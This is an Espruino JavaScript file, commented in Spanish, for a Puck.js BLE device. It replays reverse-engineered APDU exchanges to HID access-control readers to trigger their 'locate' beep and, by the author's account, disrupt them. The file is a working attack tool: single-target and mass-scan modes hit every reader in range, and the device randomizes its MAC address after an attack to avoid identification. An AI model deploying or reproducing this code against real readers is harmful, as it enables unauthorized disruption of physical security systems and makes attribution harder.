/* 
V1:
Este fichero usa el NRF52 del puck.js para disparar la funcion "locate" originalmente encontrada dentro de HID Reader Manager App, 
esta genera una conversacion usando Notify de cambios en el valor de una característica (characteristicUuid).
Luego nosotros escribimos en esa misma variable, dependiendo el valor, hay que responder con uno u otro. Para el reversing he usado el log de Android con la opcion de HCI Snoop (D)Log -usando adb bugreport-. En WireShark es importante el filtro "btatt", luego he utilizado el repositorio de startrk1995 en github, para poner nombres a los valores y no llamarlos 1,2,3...

ToDo's: 
* Meter alguna forma de atacar a todos los lectores presentes, no de 1 en 1 (cambiar requestdevice por scan NRF)
* Capturar la respuesta a E102 (Ahora da error pero es que solo veo la peti por parte del lector)
* Fix Unhandled promise rejection: InternalError: BLE task completed that wasn't scheduled (SERVICE/NONE) 
* Cambiar el comportameinto del boton, presionado largo VS corto y opcion hail mary 
* Cuando quitas Beep de la transmision, sigue pitando pero se cancela con una tarjeta y parece que no se bloquea,
    quiero ver si esto implica que hay mas formas de modificar el comportamiento del lector, modos de  solo           pitido, solo bloqueo etc...
    

V1.1:

He añadido opciones para atacar a todos los lectores presentes y para parar los ataques.
Cuando paras los ataques, se cambia la mac y se hace un softreset del NRF, asi se aplican estos cambios y 
los lectores deberían leer una MAC diferente cada vez.

Ademas la funcion de atacar todos los lectores la he construido usando el setScan(), que al contrario que requestDevice, no para todo despues de encontrar uno, lo cual debería facilitar el ataque a muchos lectores

ToDo's:

* Validar que el ataque masivo funciona y que no se cuelga de forma rara
* Terminar la invocacion (y el consiguiente pacto) con Satán para saber cómo manejar la fruta del e12
* Añadir un feedback mas claro que el puto espectáculo de luces que hay ahora
* Clean up code





Una ejecucion valida es la siguiente 
WRONG:c00a440aa000440011010            -> Wrong AID1 
WRONG:c00a440aa00038202d0110           -> Wrong AID2 
AID:  c00a440aa00038202f0110           -> Correct AID
ACK:  c00da550e121bd21b062dc81949279   -> ACK
PART1:c00ca0000                        -> PartA
PART2:c00ca0000                        -> PartB
ACK:  c00da730009bd7a45813dc61         -> ACK
BEEP: c00ca0000                        -> BeepModern
Disconnected  22



Una fallida por el e12 de los cojones es asi 
WRONG:c00a440aa00038202d0110
WRONG:c00a440aa0003820310110
Reiniciando ataque por E12:e12






*/

let clickcount = 0;
let clickevent = null;
var gatt;
var wrong = new Uint8Array([0xC0, 0x6A, 0x82]); //Wrong AID1 y Wrong AID2
var aid = new Uint8Array([0xC0, 0x6F, 0x08, 0x85, 0x06, 0x02, 0x01, 0x40, 0x02, 0x01, 0x00, 0x90, 0x00]);//Correct AID
var ack = new Uint8Array([0xC0, 0x90, 0x00]);// ACK1 y ACK2
var part1 = new Uint8Array([0x81, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x13, 0xA1, 0x11, 0xA1, 0x0F, 0x80, 0x01, 0x50, 0x81, 0x01, 0x01, 0x82]).buffer;//part1A
var part2 = new Uint8Array([0x40, 0x01, 0x01, 0x83, 0x01, 0x00, 0x84, 0x01, 0x01, 0x90, 0x00]).buffer;//part1b
var NewBeep = new Uint8Array([0xC0, 0x44, 0x3E, 0x44, 0x00, 0x00, 0x00, 0xA6, 0x06, 0xA0, 0x04, 0x85, 0x02, 0x7D, 0x00, 0x90, 0x00]);
var count = 0;
let serviceUuid = "00009800-0000-1000-8000-00177a000002";
let characteristicUuid = "0000aa00-0000-1000-8000-00177a000002";
var succ = false;



/*
Filtro con el serviceUuid de los lectores y un timeout de 10 segundos porque io que se me parecia bueno
no dejarlo infinito que la mierda esta tiene 2 de memoria
*/

let options = {
    filters: [{services: [serviceUuid]}],timeout: 10000};

/*
Funcion para buscar los lectores cercanos, lanza un device por cada lecotr encontrado
*/

function search(){
  //NRF.setScan(); //para pararlo (aunque creo haber leido que se para al devolver uno durante un tiempo?¿
  console.log("Escaneando en busca de lectores...");
  NRF.setScan(parseReader, options); //Set scan >> que request device
  LED3.set();
}

/*
Funcion para parsear cada uno de los lectores que encuentre, esto debería funcionar
*/

function parseReader(device){
  console.log("Lector encontrado!!");
  LED3.set();
  device.on('gattserverdisconnected', function(reason) {
      if (reason == 22){
      digitalPulse(LED2, 3, 1000);
      setLEDS(false, false, false);
      } else {
      digitalPulse(LED1, 3, 1000);
      setLEDS(false, false, false);

      }
      console.log("Disconnected ", reason);
  });
  device.gatt.connect().then(function(server) {
    gatt = server;
    return server.getPrimaryService(serviceUuid);
})
.then(function(service) {
    return service.getCharacteristic(characteristicUuid);
})
.then(function(characteristic) {
    characteristic.on('characteristicvaluechanged', function(event) {
        const byteArray = new Uint8Array(event.target.value.buffer);
        const hexParts = [];
        var senthex = '';
        for (i = 0; i < byteArray.length; i++) {
            const hex = byteArray[i].toString(16);
            hexParts.push(hex);
            senthex += hex;
        }
        hexParts.join('');
        if (senthex === "c00a440aa00038202f0110") {
            console.log("AID:" + senthex);
            characteristic.writeValue(aid);
        } else if (senthex.match("c00a440aa000")) {
            console.log("WRONG:" + senthex);
            characteristic.writeValue(wrong);
        } else if (senthex.match("c00da")) {
            console.log("ACK:" + senthex);
            characteristic.writeValue(ack);
        } else if (senthex === 'c00ca0000' && count == 0) {
            count = (count + 1);
            console.log("PART1:" + senthex);
            characteristic.writeValue(part1);
            setTimeout(function() {
                console.log("PART2:" + senthex);
                characteristic.writeValue(part2);
            }, 250);
        } else if (senthex.match("c00da73000")) {
            console.log("ACK2:" + senthex);
            characteristic.writeValue(ack);
        } else if (senthex.match("e12")) {
            console.log("Reiniciando ataque por E12:" + senthex);
                  digitalPulse(LED1, 3, 1000);
                  //gatt.disconnect();
                  console.log("Atacando de nuevo!!!");
                  return characteristic.startNotifications();
                  //search();
         } else if (count == 1 && senthex === 'c00ca0000') {
            LED3.reset();
            LED2.set();
            count = (count + 1);
            characteristic.writeValue(NewBeep);
            console.log("BEEP:" + senthex);
            try {
                gatt.disconnect();
            } catch (e) {}
        } else {
            console.log("Failed with " + senthex);
            gatt.disconnect();
        }
    });
    return characteristic.startNotifications();
}).catch(function(e) {
    console.log("ERROR", e);
});


}

/*
Funcion mono ataque, ataca a un solo lector, el primero que pille
*/

function attack() {
    // Nivel de batería por pantalla porque io que se
    console.log("Nivel Batería:  ", Puck.getBatteryPercentage());
    var count = 0;
    NRF.requestDevice(options) // Este requestDevice corta el scan cuando encuentra 1, hay que cambiarlo
        .then(function(device) {
            LED3.set();
            device.on('gattserverdisconnected', function(reason) {
                digitalWrite([LED3, LED2, LED1], 0);
                console.log("Disconnected ", reason);
            });
            return device.gatt.connect();
        })
        .then(function(server) {
            gatt = server;
            return server.getPrimaryService(serviceUuid);
        })
        .then(function(service) {
            return service.getCharacteristic(characteristicUuid);
        })
        .then(function(characteristic) {
            characteristic.on('characteristicvaluechanged', function(event) {
                const byteArray = new Uint8Array(event.target.value.buffer);
                const hexParts = [];
                var senthex = '';
                for (i = 0; i < byteArray.length; i++) {
                    const hex = byteArray[i].toString(16);
                    hexParts.push(hex);
                    senthex += hex;
                }
                hexParts.join('');
                if (senthex === "c00a440aa00038202f0110") {
                    console.log("AID:" + senthex);
                    characteristic.writeValue(aid);
                } else if (senthex.match("c00a440aa000")) {
                    console.log("WRONG:" + senthex);
                    characteristic.writeValue(wrong);
                } else if (senthex.match("c00da")) {
                    console.log("ACK:" + senthex);
                    characteristic.writeValue(ack);
                } else if (senthex === 'c00ca0000' && count == 0) {
                    count = (count + 1);
                    console.log("PART1:" + senthex);
                    characteristic.writeValue(part1);
                    setTimeout(function() {
                        console.log("PART2:" + senthex);
                        characteristic.writeValue(part2);
                    }, 250);
                } else if (senthex.match("c00da73000")) {
                    console.log("ACK2:" + senthex);
                    characteristic.writeValue(ack);
                } else if (senthex.match("e12")) {
                    console.log("Reiniciando ataque por E12:" + senthex);
                    try {
                          digitalPulse(LED1, 5, 500);
                          gatt.disconnect();
                          setTimeout(function () {
                          console.log("Atacando de nuevo!!!");
                          /*
                          toma recursivo, seguro que esto no causa problemas en un embebido con la memoria equivalente a la de DORI
                          */
                          attack(); 
                          }, 3000);//espera 3 segx para que le de tiempo a hacer sus mierdas
                      } catch (e) {}
                 } else if (count == 1 && senthex === 'c00ca0000') {
                    LED3.reset();
                    LED2.set();
                    count = (count + 1);
                    characteristic.writeValue(NewBeep);
                    console.log("BEEP:" + senthex);
                    try {
                        gatt.disconnect();
                    } catch (e) {}
                } else {
                    console.log("Failed with " + senthex);
                    gatt.disconnect();
                }
            });
            return characteristic.startNotifications();
        }).catch(function(e) {
            console.log("ERROR", e);
        });
}



/*
Funcion para controlar los LEDs mas facil, pero usando sintaxis guay para disimular la mierda funcion
*/

const setLEDS = (LED1on, LED2on, LED3on) => { // flechas cools y todo, no digo nada
  LED1.reset();
  LED2.reset();
  LED3.reset();

  if (LED1on) LED1.set();
  if (LED2on) LED2.set();
  if (LED3on) LED3.set();
};



/*

 Esta parte del código se encarga de añadirle funcionalidad al boton del cahcarro este, sin esto,
 el programa solo pyuede tener el input de start, quería tener 2 opciones y un parar de emergencia.

*/



setWatch((e2) => {
  clickcount++;
  try {
    if (clickevent !== null) clearTimeout(clickevent);
  } catch (e3) {
    console.log("Oops!", e3);
  }

  if (clickcount === 1) {
    setLEDS(true, false, false);
  } else if (clickcount === 2) {
    setLEDS(false, true, false);
  } else if (clickcount === 3) {
    setLEDS(false, false, true);
  } else {
    setLEDS(true, true, true);
  }

  clickevent = setTimeout(() => {
    if (clickcount === 1) {
      console.log("Click 1: Atcando sólo al lector más próximo");
      attack();
    } else if (clickcount === 2) {
      console.log("Click 2: PArando todos los ataques, randomizando la MAC (desconecta el puck)");
          try{
      gatt.disconnect();
      NRF.setScan(); //para el scan de golpe
      //static random on soft reebot baby (tienes que estar desconectadod el puck)
      NRF.setAddress("ff:ee:dd:cc:bb:aa random");
      NRF.restart();
    } catch(err){}
    } else  {
      console.log("Click 3: Atacando a todos los lectores cercanos :)");
      search();
    }
    clickcount = 0;
  }, 350);
}, BTN, {
    edge: "rising",
    debounce: 10,
    repeat: true
  });


setWatch((e2) => {
  setLEDS(false, false, false);
  setTimeout(() => {
    clickevent = null;
  }, 400);
}, BTN, {
    edge: "falling", //al contrario que antes, queremos medir el pulsado, no cuando levantas
    debounce: 10, //reduce este tiempo si eres el más rápìdo del oeste...
    repeat: true
  });



/*
setWatch(attack, BTN, {
    edge: "rising",
    debounce: 50,
    repeat: true
});
*/
